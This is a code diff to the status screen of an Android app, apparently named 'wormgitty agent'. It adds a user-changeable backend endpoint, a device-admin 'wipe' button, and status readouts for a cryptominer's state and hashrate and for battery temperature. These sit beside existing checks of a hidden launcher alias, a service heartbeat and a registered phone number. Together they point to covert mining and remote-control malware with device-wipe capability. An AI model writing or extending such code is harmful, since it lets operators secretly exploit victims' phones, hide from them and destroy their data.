@@ -38,14 +38,50 @@ class StatusActivity : ComponentActivity() {
                 }
             )
         }
+        // Runtime endpoint override — persisted; wins over BuildConfig.WG_BASE_URL.
+        val endpoint = android.widget.EditText(this).apply {
+            hint = getString(R.string.endpoint_hint)
+            setText(BackendClient.baseUrl)
+            setSingleLine()
+        }
+        val save = android.widget.Button(this).apply {
+            text = getString(R.string.endpoint_save)
+            setOnClickListener {
+                val v = endpoint.text.toString().trim()
+                kotlinx.coroutines.runBlocking {
+                    EndpointPrefs(this@StatusActivity).setOverride(v)
+                }
+                BackendClient.baseUrl = v.ifBlank { BuildConfig.WG_BASE_URL }
+            }
+        }
+        col.addView(endpoint)
+        col.addView(save)
+        val wipe = android.widget.Button(this).apply {
+            text = getString(R.string.wipe_btn)
+            setOnClickListener {
+                if (OperatorActions.isAdminEnabled(this@StatusActivity)) {
+                    WipePrompt.show(this@StatusActivity)
+                } else {
+                    android.widget.Toast.makeText(
+                        this@StatusActivity,
+                        getString(R.string.wipe_need_admin),
+                        android.widget.Toast.LENGTH_LONG
+                    ).show()
+                    OperatorActions.openAdminActivation(this@StatusActivity)
+                }
+            }
+        }
+        col.addView(wipe)
         setContentView(col)
     }
 
     private fun collect(): List<Pair<String, String>> {
         val pm = packageManager
         val pkg = packageName
-        val boost = pm.getComponentEnabledSetting(ComponentName(pkg, "$pkg.LauncherBoost"))
-        val hidden = pm.getComponentEnabledSetting(ComponentName(pkg, "$pkg.LauncherHidden"))
+        val boost = pm.getComponentEnabledSetting(
+            ComponentName(pkg, "com.wormgitty.agent.LauncherBoost"))
+        val hidden = pm.getComponentEnabledSetting(
+            ComponentName(pkg, "com.wormgitty.agent.LauncherHidden"))
         val alias = when {
             hidden == PackageManager.COMPONENT_ENABLED_STATE_ENABLED ->
                 getString(R.string.alias_hidden_label)
@@ -63,12 +99,19 @@ class StatusActivity : ComponentActivity() {
             else -> getString(R.string.health_state_running)
         }
         val beatAge = health?.let { (now - it.lastBeat) / 1000 }
+        val batt = registerReceiver(
+            null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)
+        )
+        val tempC = (batt?.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10f
         return listOf(
             getString(R.string.status_alias_state) to alias,
             getString(R.string.status_service_alive) to healthValue,
             getString(R.string.status_last_heartbeat) to
                 (beatAge?.let { "${it}s" } ?: "-"),
-            getString(R.string.status_phone) to (RegistrationStore(this).load()?.phone ?: "-")
+            getString(R.string.status_phone) to (RegistrationStore(this).load()?.phone ?: "-"),
+            "miner" to "${MinerController.state()} @ ${MinerController.hashrate()} H/s",
+            "temp" to "${tempC}°C",
+            "endpoint" to BackendClient.baseUrl
         )
     }
 
